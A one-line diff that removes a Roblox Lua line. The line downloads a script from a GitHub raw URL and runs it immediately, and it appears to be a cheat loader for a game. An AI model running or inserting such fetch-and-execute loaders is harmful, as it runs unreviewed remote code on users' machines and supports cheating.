@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/upd-fallen-survival-spam2-nprec39fn4x6jn.lua"))()
